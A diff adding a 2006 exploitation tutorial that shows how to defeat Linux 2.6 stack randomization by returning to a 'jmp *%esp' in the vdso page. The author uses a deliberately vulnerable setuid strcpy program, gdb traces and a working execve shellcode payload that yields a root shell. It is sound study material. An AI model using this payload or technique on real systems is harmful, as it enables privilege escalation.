@@ -1,0 +1,218 @@
+Returning to %esp (Circumventing the VA kernel patch For Fun and Profit)
+By phetips [at] gmail.com on a linux/x86 platform.
+
+After reading quite a few papers on stack based buffer overflow exploiting I hadn't managed to exploit a single
+stack based buffer overflow myself. I got quite frustrated and even decided to give up (on more than one occasion).
+In a weird kind of inspirational mood I was determined to figure it out, but didn't. I was lazy and wasn't sure 
+why exactly I couldn't even replicate what the papers showed me. Ah well I guess we can't all be 1337.
+
+I was lucky to have two kind Dutch hackers help me out though, twan from HDNL and eSDee from netric, and now I finally
+managed to exploit a simple example stack based buffer overflow vulnerability. You might be thinking "Why would I care 
+about that?" at this point... Well how the fuck am I supposed to know; you're reading this crap, aren't you?
+
+It's time for some technical details.
+__________________________________
+phetips@phetips-laptop:~$ uname -r
+2.6.15-27-386
+__________________________________
+
+The reason of my frustrating failures in trying to exploit a stack based buffer overflow vulnerability was that I was (still am)
+using a 2.6.x linux kernel. Our dear open-source friends decided to make buffer overflow exploiting a bit harder in the 2.6 kernels
+by applying their so-called VA patch. The effects of this patch can be seen by running 'cat /proc/self/maps' a couple of times:
+
+__________________________________
+phetips@phetips-laptop:~$ cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 16:01 12206098   /bin/cat
+0804c000-0804d000 rw-p 00003000 16:01 12206098   /bin/cat
+0804d000-0806e000 rw-p 0804d000 00:00 0          [heap]
+          [took away some crap for clarity]
+bf901000-bf916000 rw-p bf901000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+
+phetips@phetips-laptop:~$ cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 16:01 12206098   /bin/cat
+0804c000-0804d000 rw-p 00003000 16:01 12206098   /bin/cat
+0804d000-0806e000 rw-p 0804d000 00:00 0          [heap]
+          [cut some crap again]
+bfc2f000-bfc45000 rw-p bfc2f000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+__________________________________
+
+The stack has a different starting address every time the program is run. So why is this a problem?
+
+In oldskool stack based buffer overflow exploiting (before the VA patch), you would place your shellcode in your overflowable
+buffer (there are other ways to do this, but let's just stick with this for a second) and try to 'guess' the right address
+for your shellcode so you know what to overwrite the saved EIP with. If this doesn't make sense to you, you should read Smashing 
+the Stack for Fun and Profit by Aleph One.
+
+So how is this address guessed? Well, in linux kernels without the VA patch enabled the stack always starts at the same address. 
+So it was just a matter of guessing the right offset from the stack pointer (%esp) to your shellcode. Again, I might not be very 
+clear about this: go read Aleph One's paper if this doesn't make sense to you. This method of guessing the right offset is clearly 
+not possible on 2.6 kernels because of the randomization of the stack address. Now how do we solve this problem?
+
+You might have noticed the [vdso] in the output of cat /proc/self/maps and you might've even noticed that it's address is static: 
+it's the same every time we execute cat. We're going to use this fact to exploit our stack based buffer overflow vulnerability using my 
+2.6.15-27-386 linux kernel. "What stack based buffer overflow vulnerability?"; right, time to create one:
+
+__________________________________
+phetips@phetips-laptop:~/dev/shellcode_etc$ cat vuln1.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+   char buffer[20];
+   strcpy(buffer, argv[1]);
+
+   return 0;
+}
+phetips@phetips-laptop:~/dev/shellcode_etc$ gcc vuln1.c -o vuln1
+phetips@phetips-laptop:~/dev/shellcode_etc$ sudo -u root chown root.root ./vuln1
+Password:
+phetips@phetips-laptop:~/dev/shellcode_etc$ sudo -u root chmod +s ./vuln1
+_______________________________
+ 
+Okay so let's check this vulnerability out with gdb for a second. And again if you don't understand what's happening here, 
+Aleph One is your man.
+
+_______________________________
+phetips@phetips-laptop:~/dev/shellcode_etc$ gdb ./vuln1
+                  [crap]
+(gdb) run `perl -e 'print "a" x24 . "b" x4'`
+Starting program: /home/phetips/dev/shellcode_etc/vuln1 `perl -e 'print "a" x24 . "b" x4'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62626262 in ?? ()
+(gdb) i r
+eax            0x0      0
+ecx            0xffffe1e6       -7706
+edx            0xbfba99ba       -1078289990
+ebx            0xb7f7fadc       -1208485156
+esp            0xbfba7ba0       0xbfba7ba0
+ebp            0x61616161       0x61616161
+esi            0xbfba7c24       -1078297564
+edi            0xbfba7bb0       -1078297680
+eip            0x62626262       0x62626262
+eflags         0x10246  66118
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+_______________________________
+
+So, we've got our 20-bytes long buffer, 4 bytes for the saved stack pointer (note the 0x61's in %ebp) and then 4 bytes for our 
+saved %eip. So what the hell do we want in %eip anyways? We want the address of our shellcode in %eip! But since the VA patch 
+doesn't want us to know that address, we're going to have to get the address from somewhere else. 
+
+Think about it; we need to know where the vulnerable app's stack is, but we can't find out. The program itself knows where 
+the stack is though (it has it's %esp), so if we could make the vulnerable program itself jump to %esp and make sure our shellcode 
+is at %esp we would have owned the app. So we should overwrite %eip with the address of a memory location which contains the 
+opcodes for jmp *%esp (call *%esp will do just fine too).
+
+Remember the [vdso] thingy that /proc/self/maps told us about? Now what exactly is it? It's linux-gate.so.1: a virtual dynamically 
+shared object which is put in a process's virtual memory by the kernel, at a static address . What it's meant for exactly isn't 
+really important to us, what's more important is that it's address is static. It's a good place to look for our jmp *%esp opcodes! 
+Let's go.
+
+_______________________________
+phetips@phetips-laptop:~/dev/shellcode_etc$ ldd ./vuln1
+        linux-gate.so.1 =>  (0xffffe000)
+        libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7dc9000)
+        /lib/ld-linux.so.2 (0x80000000)
+phetips@phetips-laptop:~/dev/shellcode_etc$ gdb ./vuln1
+                  [crap]
+(gdb) start keanu reeves
+Breakpoint 1 at 0x8048366
+Starting program: /home/phetips/dev/shellcode_etc/vuln1 keanu reeves
+0x08048366 in main ()
+(gdb) x/i 0xffffe000
+0xffffe000:     jg     0xffffe047
+(gdb) x/1000 0xffffe000
+[crap]
+0xffffe777:     jmp    *%esp
+[crap]
+_______________________________
+
+We found our jmp *%esp instruction! Note that this is not actually a jmp *%esp instruction, it is just data that when interpreted as 
+instructions happens to be a jmp *%esp instruction. C'mon, what sane application would jmp to %esp? (hihi.)
+
+So we overwrite the saved EIP with the address of the jmp *%esp opcodes (0xffffe777) and thus make the vulnerable program jump to %esp. 
+So where do we want our shellcode to be? At the bottom of the stack (at %esp)! DuhhhhhhhhhhH!1111!111. Let's have a look at what our 
+dear vulnerable app's stack looks like after the call to strcpy.
+
+_______________________________
+phetips@phetips-laptop:~/dev/shellcode_etc$ gdb ./vuln1
+              [crap once again]
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048360 <main+0>:    push   %ebp
+0x08048361 <main+1>:    mov    %esp,%ebp
+0x08048363 <main+3>:    sub    $0x28,%esp
+0x08048366 <main+6>:    and    $0xfffffff0,%esp
+0x08048369 <main+9>:    mov    $0x0,%eax
+0x0804836e <main+14>:   add    $0xf,%eax
+0x08048371 <main+17>:   add    $0xf,%eax
+0x08048374 <main+20>:   shr    $0x4,%eax
+0x08048377 <main+23>:   shl    $0x4,%eax
+0x0804837a <main+26>:   sub    %eax,%esp
+0x0804837c <main+28>:   mov    0xc(%ebp),%eax
+0x0804837f <main+31>:   add    $0x4,%eax
+0x08048382 <main+34>:   mov    (%eax),%eax
+0x08048384 <main+36>:   mov    %eax,0x4(%esp)
+0x08048388 <main+40>:   lea    0xffffffec(%ebp),%eax
+0x0804838b <main+43>:   mov    %eax,(%esp)
+0x0804838e <main+46>:   call   0x80482b0 <strcpy@plt>
+0x08048393 <main+51>:   mov    $0x0,%eax
+0x08048398 <main+56>:   leave
+0x08048399 <main+57>:   ret
+0x0804839a <main+58>:   nop
+0x0804839b <main+59>:   nop
+
+(gdb) start AAAAAAAAAAAAAAAAAAAAAAAAA
+Breakpoint 1 at 0x8048366
+Starting program: /home/phetips/dev/shellcode_etc/vuln1 AAAAAAAAAAAAAAAAAAAAAAAAA
+[stepping through instructions of main]
+(gdb) nexti
+0x08048393 in main ()
+(gdb) x/i $eip
+0x8048393 <main+51>:    mov    $0x0,%eax                    <== we're now right after the call to to strcpy
+
+(gdb) x/50 $esp
+0xbfbc6520:     0xbfbc6544      0xbfbc79a1      0xbfbc6538      0x0804828d
+0xbfbc6530:     0xb7f9dadc      0xbfbc65f0      0xbfbc6558      0x080483b7
+0xbfbc6540:     0x00000002      0x41414141      0x41414141      0x41414141
+0xbfbc6550:     0x41414141      0x41414141      0x41414141      0xb7e80041   <== saved %eip just before our string of A's (0x41)
+[cut]
+_______________________________
+
+Okay, so right after the call to strcpy we see some crap on the top of the stack, then our string, then the saved ebp (which is 
+overwritten with 0x41414141) and then the saved %eip. What happens if the program continues?
+_______________________________
+(gdb) nexti
+0x08048398 in main ()
+(gdb) x/i $eip
+0x8048398 <main+56>:    leave
+(gdb) nexti
+Cannot access memory at address 0x41414145            <== Tries to access 4(%ebp), not really important here.
+_______________________________
+
+The last thing the program does before returning to the jmp *%esp instruction is executing the leave instruction.
+This instruction pops the saved ebp back into %ebp and sets %esp back to point to point to our saved %eip. The next instruction is RET,
+which will pop the value we've overwritten the saved eip with into %eip. The program now tries to jump to %esp. We've just seen that 
+%eip now points to right after the saved EIP. This is were we want our shellcode!
+
+_______________________________
+phetips@phetips-laptop:~/dev/shellcode_etc$ ./vuln1 `perl -e 'print "\x41" x 24 . "\x77\xe7\xff\xff" . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
+sh-3.1# whoami
+root
+_______________________________
+
+See? I put the buffer and the saved stack pointer full with \x41 (print "\x41" x 24), overwritten the saved eip
+with the address to the jmp *%esp instruction ("\x77\xe7\xff\xff") and put my shellcode right after the saved eip so %esp
+will point to it when the app returns to our lovely jmp *%esp instruction.
+
+Yay.
+
+# milw0rm.com [2006-10-03]
